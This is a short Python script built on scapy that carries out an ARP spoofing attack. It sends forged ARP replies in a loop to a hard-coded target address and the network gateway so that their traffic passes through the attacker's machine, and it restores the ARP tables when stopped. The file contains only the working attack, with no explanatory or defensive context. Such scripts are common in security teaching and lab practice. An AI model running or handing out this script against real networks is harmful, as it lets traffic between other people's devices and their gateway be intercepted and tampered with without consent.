
import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    ans_lis = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return ans_lis[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip): # dest_IP refers to the one spoofed and source_ip is the one spoofed through
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)

tar_ip = "192.168.1.109"
gateway_ip = "192.168.1.254"

try:
    packets_sent = 0
    while True:
        spoof(tar_ip, gateway_ip)
        spoof(gateway_ip, tar_ip)
        packets_sent += 2
        #print("\r[+] Sent " + str(packets_sent), end="")
        print("[+] Sent " + str(packets_sent))
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected..... Restoring ARP Tables.....\n")
    restore(tar_ip, gateway_ip)
    restore(gateway_ip, tar_ip)
